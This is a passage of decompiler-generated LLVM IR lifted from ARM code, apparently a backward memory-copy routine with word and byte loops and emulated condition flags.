  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_1b46c = icmp eq i32 %v1_1b46c, 0
  store i1 %v2_1b46c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1b46c, label %dec_label_pc_1b474, label %dec_label_pc_1b538

dec_label_pc_1b474:                               ; preds = %dec_label_pc_1b46c, %dec_label_pc_1b530
  %v0_1b48c36 = phi i32 [ %v2_1b458, %dec_label_pc_1b46c ], [ %v0_1b58019, %dec_label_pc_1b530 ]
  %v0_1b48835 = phi i32 [ %v2_1b454, %dec_label_pc_1b46c ], [ %v0_1b530, %dec_label_pc_1b530 ]
  %v0_1b474 = phi i32 [ %v2_1b45c, %dec_label_pc_1b46c ], [ %v2_1b528, %dec_label_pc_1b530 ]
  %v2_1b474 = add i32 %v0_1b474, -8
  store i32 %v2_1b474, i32* %r2.global-to-local, align 4
  %v4_1b474 = sub i32 7, %v0_1b474
  %v5_1b474 = and i32 %v4_1b474, %v0_1b474
  %v6_1b474 = icmp slt i32 %v5_1b474, 0
  store i1 %v6_1b474, i1* %cpsr_v.global-to-local, align 1
  %v7_1b474 = icmp slt i32 %v2_1b474, 0
  store i1 %v7_1b474, i1* %cpsr_n.global-to-local, align 1
  %v8_1b474 = icmp eq i32 %v0_1b474, 8
  store i1 %v8_1b474, i1* %cpsr_z.global-to-local, align 1
  %v5_1b478 = icmp slt i32 %v0_1b474, 8
  br i1 %v5_1b478, label %dec_label_pc_1b4c4, label %dec_label_pc_1b47c

dec_label_pc_1b47c:                               ; preds = %dec_label_pc_1b474
  %v3_1b47c = load i32, i32* @r4, align 4
  %v5_1b47c = inttoptr i32 %v3_1b47c to i8*
  store i8* %v5_1b47c, i8** %stack_var_-8, align 4
  %v8_1b47c = load i32, i32* @lr, align 4
  %v2_1b480 = add i32 %v0_1b474, -28
  store i32 %v2_1b480, i32* %r2.global-to-local, align 4
  %v4_1b480 = sub i32 27, %v0_1b474
  %v5_1b480 = and i32 %v4_1b480, %v2_1b474
  %v6_1b480 = icmp slt i32 %v5_1b480, 0
  store i1 %v6_1b480, i1* %cpsr_v.global-to-local, align 1
  %v7_1b480 = icmp slt i32 %v2_1b480, 0
  store i1 %v7_1b480, i1* %cpsr_n.global-to-local, align 1
  %v8_1b480 = icmp eq i32 %v2_1b474, 20
  store i1 %v8_1b480, i1* %cpsr_z.global-to-local, align 1
  %v5_1b484 = icmp slt i32 %v2_1b474, 20
  br i1 %v5_1b484, label %dec_label_pc_1b4a0, label %dec_label_pc_1b488

dec_label_pc_1b488:                               ; preds = %dec_label_pc_1b47c, %dec_label_pc_1b488.dec_label_pc_1b488_crit_edge
  %v0_1b48c = phi i32 [ %v1_1b494, %dec_label_pc_1b488.dec_label_pc_1b488_crit_edge ], [ %v0_1b48c36, %dec_label_pc_1b47c ]
  %v0_1b488 = phi i32 [ %v0_1b488.pre, %dec_label_pc_1b488.dec_label_pc_1b488_crit_edge ], [ %v0_1b48835, %dec_label_pc_1b47c ]
  %v1_1b488 = add i32 %v0_1b488, -4
  %v2_1b488 = inttoptr i32 %v1_1b488 to i32*
  %v3_1b488 = load i32, i32* %v2_1b488, align 4
  %v4_1b488 = add i32 %v0_1b488, -8
  %v5_1b488 = inttoptr i32 %v4_1b488 to i32*
  %v6_1b488 = load i32, i32* %v5_1b488, align 4
  store i32 %v6_1b488, i32* %r4.global-to-local, align 4
  %v7_1b488 = add i32 %v0_1b488, -12
  %v8_1b488 = inttoptr i32 %v7_1b488 to i32*
  %v9_1b488 = load i32, i32* %v8_1b488, align 4
  store i32 %v9_1b488, i32* %ip.global-to-local, align 4
  %v10_1b488 = add i32 %v0_1b488, -16
  %v11_1b488 = inttoptr i32 %v10_1b488 to i32*
  %v12_1b488 = load i32, i32* %v11_1b488, align 4
  store i32 %v12_1b488, i32* %lr.global-to-local, align 4
  store i32 %v10_1b488, i32* %r1.global-to-local, align 4
  %v1_1b48c = add i32 %v0_1b48c, -16
  %v2_1b48c = inttoptr i32 %v1_1b48c to i32*
  store i32 %v3_1b488, i32* %v2_1b48c, align 4
  %v4_1b48c = add i32 %v0_1b48c, -12
  %v5_1b48c = inttoptr i32 %v4_1b48c to i32*
  %v6_1b48c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v6_1b48c, i32* %v5_1b48c, align 4
  %v7_1b48c = add i32 %v0_1b48c, -8
  %v8_1b48c = inttoptr i32 %v7_1b48c to i32*
  %v9_1b48c = load i32, i32* %ip.global-to-local, align 4
  store i32 %v9_1b48c, i32* %v8_1b48c, align 4
  %v10_1b48c = add i32 %v0_1b48c, -4
  %v11_1b48c = inttoptr i32 %v10_1b48c to i32*
  %v12_1b48c = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_1b48c, i32* %v11_1b48c, align 4
  store i32 %v1_1b48c, i32* %r0.global-to-local, align 4
  %v0_1b490 = load i32, i32* %r1.global-to-local, align 4
  %v1_1b490 = add i32 %v0_1b490, -4
  %v2_1b490 = inttoptr i32 %v1_1b490 to i32*
  %v3_1b490 = load i32, i32* %v2_1b490, align 4
  store i32 %v3_1b490, i32* @r3, align 4
  %v4_1b490 = add i32 %v0_1b490, -8
  %v5_1b490 = inttoptr i32 %v4_1b490 to i32*
  %v6_1b490 = load i32, i32* %v5_1b490, align 4
  store i32 %v6_1b490, i32* %r4.global-to-local, align 4
  %v7_1b490 = add i32 %v0_1b490, -12
  %v8_1b490 = inttoptr i32 %v7_1b490 to i32*
  %v9_1b490 = load i32, i32* %v8_1b490, align 4
  store i32 %v9_1b490, i32* @ip, align 4
  %v10_1b490 = add i32 %v0_1b490, -16
  %v11_1b490 = inttoptr i32 %v10_1b490 to i32*
  %v12_1b490 = load i32, i32* %v11_1b490, align 4
  store i32 %v12_1b490, i32* %lr.global-to-local, align 4
  store i32 %v10_1b490, i32* %r1.global-to-local, align 4
  %v1_1b494 = add i32 %v0_1b48c, -32
  %v2_1b494 = inttoptr i32 %v1_1b494 to i32*
  store i32 %v3_1b490, i32* %v2_1b494, align 4
  %v4_1b494 = add i32 %v0_1b48c, -28
  %v5_1b494 = inttoptr i32 %v4_1b494 to i32*
  %v6_1b494 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v6_1b494, i32* %v5_1b494, align 4
  %v7_1b494 = add i32 %v0_1b48c, -24
  %v8_1b494 = inttoptr i32 %v7_1b494 to i32*
  %v9_1b494 = load i32, i32* @ip, align 4
  store i32 %v9_1b494, i32* %v8_1b494, align 4
  %v10_1b494 = add i32 %v0_1b48c, -20
  %v11_1b494 = inttoptr i32 %v10_1b494 to i32*
  %v12_1b494 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_1b494, i32* %v11_1b494, align 4
  store i32 %v1_1b494, i32* %r0.global-to-local, align 4
  %v0_1b498 = load i32, i32* %r2.global-to-local, align 4
  %v2_1b498 = add i32 %v0_1b498, -32
  store i32 %v2_1b498, i32* %r2.global-to-local, align 4
  %v6_1b49c = icmp slt i32 %v0_1b498, 32
  br i1 %v6_1b49c, label %dec_label_pc_1b4a0.loopexit, label %dec_label_pc_1b488.dec_label_pc_1b488_crit_edge

dec_label_pc_1b488.dec_label_pc_1b488_crit_edge:  ; preds = %dec_label_pc_1b488
  %v0_1b488.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1b488

dec_label_pc_1b4a0.loopexit:                      ; preds = %dec_label_pc_1b488
  %v4_1b498 = sub i32 31, %v0_1b498
  %v5_1b498 = and i32 %v4_1b498, %v0_1b498
  %v6_1b498 = icmp slt i32 %v5_1b498, 0
  %v7_1b498 = icmp slt i32 %v2_1b498, 0
  store i1 %v6_1b498, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_1b498, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_1b4a0

dec_label_pc_1b4a0:                               ; preds = %dec_label_pc_1b4a0.loopexit, %dec_label_pc_1b47c
  %v6_1b4a8 = phi i32 [ %v1_1b494, %dec_label_pc_1b4a0.loopexit ], [ %v0_1b48c36, %dec_label_pc_1b47c ]
  %v0_1b4b0.pr = phi i32 [ %v2_1b498, %dec_label_pc_1b4a0.loopexit ], [ %v2_1b480, %dec_label_pc_1b47c ]
  %v4_1b4a0 = add i32 %v0_1b4b0.pr, 16
  %v6_1b4a0 = sub i32 0, %v0_1b4b0.pr
  %v7_1b4a0 = and i32 %v4_1b4a0, %v6_1b4a0
  %v8_1b4a0 = icmp slt i32 %v7_1b4a0, 0
  store i1 %v8_1b4a0, i1* %cpsr_v.global-to-local, align 1
  %v9_1b4a0 = icmp slt i32 %v4_1b4a0, 0
  store i1 %v9_1b4a0, i1* %cpsr_n.global-to-local, align 1
  %v10_1b4a0 = icmp eq i32 %v4_1b4a0, 0
  store i1 %v10_1b4a0, i1* %cpsr_z.global-to-local, align 1
  %v5_1b4a4 = icmp slt i32 %v0_1b4b0.pr, -16
  br i1 %v5_1b4a4, label %.thread1, label %bb147

bb147:                                            ; preds = %dec_label_pc_1b4a0
  %v6_1b4a4 = load i32, i32* %r1.global-to-local, align 4
  %v7_1b4a4 = add i32 %v6_1b4a4, -4
  %v8_1b4a4 = inttoptr i32 %v7_1b4a4 to i32*
  %v9_1b4a4 = load i32, i32* %v8_1b4a4, align 4
  store i32 %v9_1b4a4, i32* @r3, align 4
  %v10_1b4a4 = add i32 %v6_1b4a4, -8
  %v11_1b4a4 = inttoptr i32 %v10_1b4a4 to i32*
  %v12_1b4a4 = load i32, i32* %v11_1b4a4, align 4
  store i32 %v12_1b4a4, i32* %r4.global-to-local, align 4
  %v13_1b4a4 = add i32 %v6_1b4a4, -12
  %v14_1b4a4 = inttoptr i32 %v13_1b4a4 to i32*
  %v15_1b4a4 = load i32, i32* %v14_1b4a4, align 4
  store i32 %v15_1b4a4, i32* @ip, align 4
  %v16_1b4a4 = add i32 %v6_1b4a4, -16
  %v17_1b4a4 = inttoptr i32 %v16_1b4a4 to i32*
  %v18_1b4a4 = load i32, i32* %v17_1b4a4, align 4
  store i32 %v18_1b4a4, i32* %lr.global-to-local, align 4
  store i32 %v16_1b4a4, i32* %r1.global-to-local, align 4
  %v7_1b4a8 = add i32 %v6_1b4a8, -16
  %v8_1b4a8 = inttoptr i32 %v7_1b4a8 to i32*
  store i32 %v9_1b4a4, i32* %v8_1b4a8, align 4
  %v10_1b4a8 = add i32 %v6_1b4a8, -12
  %v11_1b4a8 = inttoptr i32 %v10_1b4a8 to i32*
  %v12_1b4a8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v12_1b4a8, i32* %v11_1b4a8, align 4
  %v13_1b4a8 = add i32 %v6_1b4a8, -8
  %v14_1b4a8 = inttoptr i32 %v13_1b4a8 to i32*
  %v15_1b4a8 = load i32, i32* @ip, align 4
  store i32 %v15_1b4a8, i32* %v14_1b4a8, align 4
  %v16_1b4a8 = add i32 %v6_1b4a8, -4
  %v17_1b4a8 = inttoptr i32 %v16_1b4a8 to i32*
  %v18_1b4a8 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v18_1b4a8, i32* %v17_1b4a8, align 4
  store i32 %v7_1b4a8, i32* %r0.global-to-local, align 4
  %v6_1b4ac = load i32, i32* %r2.global-to-local, align 4
  %v7_1b4ac = add i32 %v6_1b4ac, -16
  store i32 %v7_1b4ac, i32* %r2.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_1b4a0, %bb147
  %v6_1b4b8 = phi i32 [ %v7_1b4a8, %bb147 ], [ %v6_1b4a8, %dec_label_pc_1b4a0 ]
  %v0_1b4b0 = phi i32 [ %v7_1b4ac, %bb147 ], [ %v0_1b4b0.pr, %dec_label_pc_1b4a0 ]
  %v4_1b4b0 = add i32 %v0_1b4b0, 20
  store i32 %v4_1b4b0, i32* %r2.global-to-local, align 4
  %v6_1b4b0 = sub i32 0, %v0_1b4b0
  %v7_1b4b0 = and i32 %v4_1b4b0, %v6_1b4b0
  %v8_1b4b0 = icmp slt i32 %v7_1b4b0, 0
  store i1 %v8_1b4b0, i1* %cpsr_v.global-to-local, align 1
  %v9_1b4b0 = icmp slt i32 %v4_1b4b0, 0
  store i1 %v9_1b4b0, i1* %cpsr_n.global-to-local, align 1
  %v10_1b4b0 = icmp eq i32 %v4_1b4b0, 0
  store i1 %v10_1b4b0, i1* %cpsr_z.global-to-local, align 1
  %v5_1b4b4 = icmp slt i32 %v0_1b4b0, -20
  br i1 %v5_1b4b4, label %.thread3, label %bb148

bb148:                                            ; preds = %.thread1
  %v6_1b4b4 = load i32, i32* %r1.global-to-local, align 4
  %v7_1b4b4 = add i32 %v6_1b4b4, -4
  %v8_1b4b4 = inttoptr i32 %v7_1b4b4 to i32*
  %v9_1b4b4 = load i32, i32* %v8_1b4b4, align 4
  store i32 %v9_1b4b4, i32* @r3, align 4
  %v10_1b4b4 = add i32 %v6_1b4b4, -8
  %v11_1b4b4 = inttoptr i32 %v10_1b4b4 to i32*
  %v12_1b4b4 = load i32, i32* %v11_1b4b4, align 4
  store i32 %v12_1b4b4, i32* @ip, align 4
  %v13_1b4b4 = add i32 %v6_1b4b4, -12
  %v14_1b4b4 = inttoptr i32 %v13_1b4b4 to i32*
  %v15_1b4b4 = load i32, i32* %v14_1b4b4, align 4
  store i32 %v15_1b4b4, i32* %lr.global-to-local, align 4
  store i32 %v13_1b4b4, i32* %r1.global-to-local, align 4
  %v7_1b4b8 = add i32 %v6_1b4b8, -12
  %v8_1b4b8 = inttoptr i32 %v7_1b4b8 to i32*
  store i32 %v9_1b4b4, i32* %v8_1b4b8, align 4
  %v10_1b4b8 = add i32 %v6_1b4b8, -8
  %v11_1b4b8 = inttoptr i32 %v10_1b4b8 to i32*
  %v12_1b4b8 = load i32, i32* @ip, align 4
  store i32 %v12_1b4b8, i32* %v11_1b4b8, align 4
  %v13_1b4b8 = add i32 %v6_1b4b8, -4
  %v14_1b4b8 = inttoptr i32 %v13_1b4b8 to i32*
  %v15_1b4b8 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v15_1b4b8, i32* %v14_1b4b8, align 4
  store i32 %v7_1b4b8, i32* %r0.global-to-local, align 4
  %v6_1b4bc = load i32, i32* %r2.global-to-local, align 4
  %v7_1b4bc = add i32 %v6_1b4bc, -12
  store i32 %v7_1b4bc, i32* %r2.global-to-local, align 4
  br label %.thread3

.thread3:                                         ; preds = %.thread1, %bb148
  %v6_1b4dc44 = phi i32 [ %v6_1b4b8, %.thread1 ], [ %v7_1b4b8, %bb148 ]
  %v0_1b4c442 = phi i32 [ %v4_1b4b0, %.thread1 ], [ %v7_1b4bc, %bb148 ]
  %v2_1b4c0 = load i8*, i8** %stack_var_-8, align 4
  %v3_1b4c0 = ptrtoint i8* %v2_1b4c0 to i32
  store i32 %v3_1b4c0, i32* @r4, align 4
  store i32 %v8_1b47c, i32* @lr, align 4
  br label %dec_label_pc_1b4c4

dec_label_pc_1b4c4:                               ; preds = %dec_label_pc_1b474, %.thread3
  %v7_1b4d4 = phi i32 [ %v0_1b48c36, %dec_label_pc_1b474 ], [ %v6_1b4dc44, %.thread3 ]
  %v0_1b4c4 = phi i32 [ %v2_1b474, %dec_label_pc_1b474 ], [ %v0_1b4c442, %.thread3 ]
  %v2_1b4c4 = add i32 %v0_1b4c4, 8
  store i32 %v2_1b4c4, i32* %r2.global-to-local, align 4
  %v4_1b4c4 = sub i32 0, %v0_1b4c4
  %v5_1b4c4 = and i32 %v2_1b4c4, %v4_1b4c4
  %v6_1b4c4 = icmp slt i32 %v5_1b4c4, 0
  store i1 %v6_1b4c4, i1* %cpsr_v.global-to-local, align 1
  %v7_1b4c4 = icmp slt i32 %v2_1b4c4, 0
  store i1 %v7_1b4c4, i1* %cpsr_n.global-to-local, align 1
  %v8_1b4c4 = icmp eq i32 %v2_1b4c4, 0
  store i1 %v8_1b4c4, i1* %cpsr_z.global-to-local, align 1
  %v5_1b4c8 = icmp slt i32 %v0_1b4c4, -8
  br i1 %v5_1b4c8, label %bb150, label %dec_label_pc_1b4cc

dec_label_pc_1b4cc:                               ; preds = %dec_label_pc_1b4c4
  %v6_1b4cc = add i32 %v0_1b4c4, 4
  store i32 %v6_1b4cc, i32* %r2.global-to-local, align 4
  %v8_1b4cc = sub i32 -5, %v0_1b4c4
  %v9_1b4cc = and i32 %v8_1b4cc, %v2_1b4c4
  %v10_1b4cc = icmp slt i32 %v9_1b4cc, 0
  store i1 %v10_1b4cc, i1* %cpsr_v.global-to-local, align 1
  %v11_1b4cc = icmp slt i32 %v6_1b4cc, 0
  store i1 %v11_1b4cc, i1* %cpsr_n.global-to-local, align 1
  %v12_1b4cc = icmp eq i32 %v2_1b4c4, 4
  store i1 %v12_1b4cc, i1* %cpsr_z.global-to-local, align 1
  %v5_1b4d0 = icmp slt i32 %v2_1b4c4, 4
  %v6_1b4d0 = load i32, i32* %r1.global-to-local, align 4
  %v7_1b4d0 = add i32 %v6_1b4d0, -4
  %v8_1b4d0 = inttoptr i32 %v7_1b4d0 to i32*
  %v9_1b4d0 = load i32, i32* %v8_1b4d0, align 4
  store i32 %v9_1b4d0, i32* @r3, align 4
  br i1 %v5_1b4d0, label %.thread7, label %bb149

.thread7:                                         ; preds = %dec_label_pc_1b4cc
  store i32 %v7_1b4d0, i32* %r1.global-to-local, align 4
  %v8_1b4d4 = add i32 %v7_1b4d4, -4
  %v9_1b4d4 = inttoptr i32 %v8_1b4d4 to i32*
  store i32 %v9_1b4d0, i32* %v9_1b4d4, align 4
  %v10_1b4d4 = load i32, i32* %r0.global-to-local, align 4
  %v11_1b4d4 = add i32 %v10_1b4d4, -4
  store i32 %v11_1b4d4, i32* %r0.global-to-local, align 4
  %v0_1b4e4.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb150

bb149:                                            ; preds = %dec_label_pc_1b4cc
  %v10_1b4d8 = add i32 %v6_1b4d0, -8
  %v11_1b4d8 = inttoptr i32 %v10_1b4d8 to i32*
  %v12_1b4d8 = load i32, i32* %v11_1b4d8, align 4
  store i32 %v12_1b4d8, i32* @ip, align 4
  store i32 %v10_1b4d8, i32* %r1.global-to-local, align 4
  %v7_1b4dc = add i32 %v7_1b4d4, -8
  %v8_1b4dc = inttoptr i32 %v7_1b4dc to i32*
  store i32 %v9_1b4d0, i32* %v8_1b4dc, align 4
  %v10_1b4dc = add i32 %v7_1b4d4, -4
  %v11_1b4dc = inttoptr i32 %v10_1b4dc to i32*
  %v12_1b4dc = load i32, i32* @ip, align 4
  store i32 %v12_1b4dc, i32* %v11_1b4dc, align 4
  store i32 %v7_1b4dc, i32* %r0.global-to-local, align 4
  %v6_1b4e0 = load i32, i32* %r2.global-to-local, align 4
  %v7_1b4e0 = add i32 %v6_1b4e0, -4
  store i32 %v7_1b4e0, i32* %r2.global-to-local, align 4
  br label %bb150

bb150:                                            ; preds = %.thread7, %dec_label_pc_1b4c4, %dec_label_pc_1b454, %.thread13, %dec_label_pc_1b688, %dec_label_pc_1b61c, %dec_label_pc_1b5b0, %bb149
  %v2_1b4e8 = phi i32 [ %v11_1b4d4, %.thread7 ], [ %v7_1b4d4, %dec_label_pc_1b4c4 ], [ %v2_1b458, %dec_label_pc_1b454 ], [ %v0_1b58019, %.thread13 ], [ %v2_1b4f452, %dec_label_pc_1b688 ], [ %v2_1b4f451, %dec_label_pc_1b61c ], [ %v2_1b4f450, %dec_label_pc_1b5b0 ], [ %v7_1b4dc, %bb149 ]
  %v0_1b4e4 = phi i32 [ %v0_1b4e4.pre, %.thread7 ], [ %v2_1b4c4, %dec_label_pc_1b4c4 ], [ %v2_1b45c, %dec_label_pc_1b454 ], [ %v2_1b528, %.thread13 ], [ %v0_1b4e448, %dec_label_pc_1b688 ], [ %v0_1b4e447, %dec_label_pc_1b61c ], [ %v0_1b4e446, %dec_label_pc_1b5b0 ], [ %v7_1b4e0, %bb149 ]
  %v1_1b4e4 = add i32 %v0_1b4e4, 4
  store i32 %v1_1b4e4, i32* @r2, align 4
  %v3_1b4e4 = sub i32 0, %v0_1b4e4
  %v4_1b4e4 = and i32 %v1_1b4e4, %v3_1b4e4
  %v5_1b4e4 = icmp slt i32 %v4_1b4e4, 0
  store i1 %v5_1b4e4, i1* %cpsr_v.global-to-local, align 1
  %v6_1b4e4 = icmp slt i32 %v1_1b4e4, 0
  store i1 %v6_1b4e4, i1* %cpsr_n.global-to-local, align 1
  %v7_1b4e4 = icmp eq i32 %v1_1b4e4, 0
  store i1 %v7_1b4e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1b4e4, label %.thread129, label %bb151

bb151:                                            ; preds = %bb150
  %v1_1b4ec = add i32 %v0_1b4e4, 2
  %v3_1b4ec = sub i32 -3, %v0_1b4e4
  %v4_1b4ec = and i32 %v3_1b4ec, %v1_1b4e4
  %v5_1b4ec = icmp slt i32 %v4_1b4ec, 0
  store i1 %v5_1b4ec, i1* %cpsr_v.global-to-local, align 1
  %v6_1b4ec = icmp slt i32 %v1_1b4ec, 0
  store i1 %v6_1b4ec, i1* %cpsr_n.global-to-local, align 1
  %v7_1b4ec = icmp eq i32 %v1_1b4e4, 2
  store i1 %v7_1b4ec, i1* %cpsr_z.global-to-local, align 1
  %v0_1b4f0 = load i32, i32* %r1.global-to-local, align 4
  %v1_1b4f0 = add i32 %v0_1b4f0, -1
  %v2_1b4f0 = inttoptr i32 %v1_1b4f0 to i8*
  %v3_1b4f0 = load i8, i8* %v2_1b4f0, align 1
  %v4_1b4f0 = zext i8 %v3_1b4f0 to i32
  store i32 %v4_1b4f0, i32* @r3, align 4
  store i32 %v1_1b4f0, i32* %r1.global-to-local, align 4
  %v3_1b4f4 = add i32 %v2_1b4e8, -1
  %v4_1b4f4 = inttoptr i32 %v3_1b4f4 to i8*
  store i8 %v3_1b4f0, i8* %v4_1b4f4, align 1
  %v5_1b4f4 = load i32, i32* %r0.global-to-local, align 4
  %v6_1b4f4 = add i32 %v5_1b4f4, -1
  store i32 %v6_1b4f4, i32* %r0.global-to-local, align 4
  %v0_1b4f8 = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_1b4f8 = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_1b4f8 = xor i1 %v0_1b4f8, %v1_1b4f8
  br i1 %v2_1b4f8, label %.thread128, label %bb152

bb152:                                            ; preds = %bb151
  %v3_1b4f8 = load i32, i32* %r1.global-to-local, align 4
  %v4_1b4f8 = add i32 %v3_1b4f8, -1
  %v5_1b4f8 = inttoptr i32 %v4_1b4f8 to i8*
  %v6_1b4f8 = load i8, i8* %v5_1b4f8, align 1
  %v7_1b4f8 = zext i8 %v6_1b4f8 to i32
  store i32 %v7_1b4f8, i32* @r3, align 4
  store i32 %v4_1b4f8, i32* %r1.global-to-local, align 4
  %v6_1b4fc = add i32 %v5_1b4f4, -2
  %v7_1b4fc = inttoptr i32 %v6_1b4fc to i8*
  store i8 %v6_1b4f8, i8* %v7_1b4fc, align 1
  %v8_1b4fc = load i32, i32* %r0.global-to-local, align 4
  %v9_1b4fc = add i32 %v8_1b4fc, -1
  store i32 %v9_1b4fc, i32* %r0.global-to-local, align 4
  %v1_1b500.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_1b500.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread128

.thread128:                                       ; preds = %bb151, %bb152
  %v7_1b504 = phi i32 [ %v9_1b4fc, %bb152 ], [ %v6_1b4f4, %bb151 ]
  %v2_1b504 = phi i1 [ %v2_1b500.pre, %bb152 ], [ %v1_1b4f8, %bb151 ]
  %v1_1b504 = phi i1 [ %v1_1b500.pre, %bb152 ], [ %v0_1b4f8, %bb151 ]
  %v0_1b500 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v3_1b500 = xor i1 %v2_1b504, %v1_1b504
  %v4_1b500 = or i1 %v0_1b500, %v3_1b500
  br i1 %v4_1b500, label %.thread129, label %bb153

bb153:                                            ; preds = %.thread128
  %v5_1b500 = load i32, i32* %r1.global-to-local, align 4
  %v6_1b500 = add i32 %v5_1b500, -1
  %v7_1b500 = inttoptr i32 %v6_1b500 to i8*
  %v8_1b500 = load i8, i8* %v7_1b500, align 1
  %v9_1b500 = zext i8 %v8_1b500 to i32
  store i32 %v9_1b500, i32* @r3, align 4
  store i32 %v6_1b500, i32* %r1.global-to-local, align 4
  %v8_1b504 = add i32 %v7_1b504, -1
  %v9_1b504 = inttoptr i32 %v8_1b504 to i8*
  store i8 %v8_1b500, i8* %v9_1b504, align 1
  %v10_1b504 = load i32, i32* %r0.global-to-local, align 4
  %v11_1b504 = add i32 %v10_1b504, -1
  store i32 %v11_1b504, i32* %r0.global-to-local, align 4
  br label %.thread129

dec_label_pc_1b50c:                               ; preds = %dec_label_pc_1b464
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v8_1b50c = icmp eq i32 %v1_1b464, 1
  store i1 %v8_1b50c, i1* %cpsr_n.global-to-local, align 1
  %v9_1b50c = icmp eq i32 %v1_1b464, 2
  store i1 %v9_1b50c, i1* %cpsr_z.global-to-local, align 1
  %v1_1b510 = add i32 %v2_1b454, -1
  %v2_1b510 = inttoptr i32 %v1_1b510 to i8*
  %v3_1b510 = load i8, i8* %v2_1b510, align 1
  %v4_1b510 = zext i8 %v3_1b510 to i32
  store i32 %v4_1b510, i32* @r3, align 4
  store i32 %v1_1b510, i32* %r1.global-to-local, align 4
  %v3_1b514 = add i32 %v2_1b458, -1
  %v4_1b514 = inttoptr i32 %v3_1b514 to i8*
  store i8 %v3_1b510, i8* %v4_1b514, align 1
  %v5_1b514 = load i32, i32* %r0.global-to-local, align 4
  %v6_1b514 = add i32 %v5_1b514, -1
  store i32 %v6_1b514, i32* %r0.global-to-local, align 4
  br i1 %v8_1b50c, label %.thread13, label %bb154

bb154:                                            ; preds = %dec_label_pc_1b50c
  %v6_1b518 = load i32, i32* %r1.global-to-local, align 4
  %v7_1b518 = add i32 %v6_1b518, -1
  %v8_1b518 = inttoptr i32 %v7_1b518 to i8*
  %v9_1b518 = load i8, i8* %v8_1b518, align 1
  %v10_1b518 = zext i8 %v9_1b518 to i32
  store i32 %v10_1b518, i32* @r3, align 4
  store i32 %v7_1b518, i32* %r1.global-to-local, align 4
  %v9_1b51c = add i32 %v5_1b514, -2
  %v10_1b51c = inttoptr i32 %v9_1b51c to i8*
  store i8 %v9_1b518, i8* %v10_1b51c, align 1
  %v11_1b51c = load i32, i32* %r0.global-to-local, align 4
  %v12_1b51c = add i32 %v11_1b51c, -1
  store i32 %v12_1b51c, i32* %r0.global-to-local, align 4
  br i1 %v9_1b50c, label %.thread13, label %bb155

bb155:                                            ; preds = %bb154
  %v8_1b520 = load i32, i32* %r1.global-to-local, align 4
  %v9_1b520 = add i32 %v8_1b520, -1
  %v10_1b520 = inttoptr i32 %v9_1b520 to i8*
  %v11_1b520 = load i8, i8* %v10_1b520, align 1
  %v12_1b520 = zext i8 %v11_1b520 to i32
  store i32 %v12_1b520, i32* @r3, align 4
  store i32 %v9_1b520, i32* %r1.global-to-local, align 4
  %v11_1b524 = add i32 %v11_1b51c, -2
  %v12_1b524 = inttoptr i32 %v11_1b524 to i8*
  store i8 %v11_1b520, i8* %v12_1b524, align 1
  %v13_1b524 = load i32, i32* %r0.global-to-local, align 4
  %v14_1b524 = add i32 %v13_1b524, -1
  store i32 %v14_1b524, i32* %r0.global-to-local, align 4
  br label %.thread13

.thread13:                                        ; preds = %bb154, %dec_label_pc_1b50c, %bb155
  %v0_1b58019 = phi i32 [ %v12_1b51c, %bb154 ], [ %v6_1b514, %dec_label_pc_1b50c ], [ %v14_1b524, %bb155 ]
  %v0_1b528 = load i32, i32* %r2.global-to-local, align 4
  %v1_1b528 = load i32, i32* @ip, align 4
  %v2_1b528 = sub i32 %v0_1b528, %v1_1b528
  store i32 %v2_1b528, i32* %r2.global-to-local, align 4
  %v4_1b528 = xor i32 %v1_1b528, %v0_1b528
  %v5_1b528 = xor i32 %v2_1b528, %v0_1b528
  %v6_1b528 = and i32 %v5_1b528, %v4_1b528
  %v7_1b528 = icmp slt i32 %v6_1b528, 0
  store i1 %v7_1b528, i1* %cpsr_v.global-to-local, align 1
  %v8_1b528 = icmp slt i32 %v2_1b528, 0
  store i1 %v8_1b528, i1* %cpsr_n.global-to-local, align 1
  %v9_1b528 = icmp eq i32 %v0_1b528, %v1_1b528
  store i1 %v9_1b528, i1* %cpsr_z.global-to-local, align 1
  %v5_1b52c = icmp slt i32 %v0_1b528, %v1_1b528
  br i1 %v5_1b52c, label %bb150, label %dec_label_pc_1b530

dec_label_pc_1b530:                               ; preds = %.thread13
  %v0_1b530 = load i32, i32* %r1.global-to-local, align 4
  %v1_1b530 = urem i32 %v0_1b530, 4
  store i32 %v1_1b530, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_1b530 = icmp eq i32 %v1_1b530, 0
  store i1 %v2_1b530, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1b530, label %dec_label_pc_1b474, label %dec_label_pc_1b538

dec_label_pc_1b538:                               ; preds = %dec_label_pc_1b46c, %dec_label_pc_1b530
  %v0_1b58018 = phi i32 [ %v2_1b458, %dec_label_pc_1b46c ], [ %v0_1b58019, %dec_label_pc_1b530 ]
  %v0_1b62c = phi i32 [ %v2_1b45c, %dec_label_pc_1b46c ], [ %v2_1b528, %dec_label_pc_1b530 ]
  %v0_1b538 = phi i32 [ %v2_1b454, %dec_label_pc_1b46c ], [ %v0_1b530, %dec_label_pc_1b530 ]
  %v0_1b540 = phi i32 [ %v1_1b46c, %dec_label_pc_1b46c ], [ %v1_1b530, %dec_label_pc_1b530 ]
  %v1_1b538 = and i32 %v0_1b538, -4
  store i32 %v1_1b538, i32* %r1.global-to-local, align 4
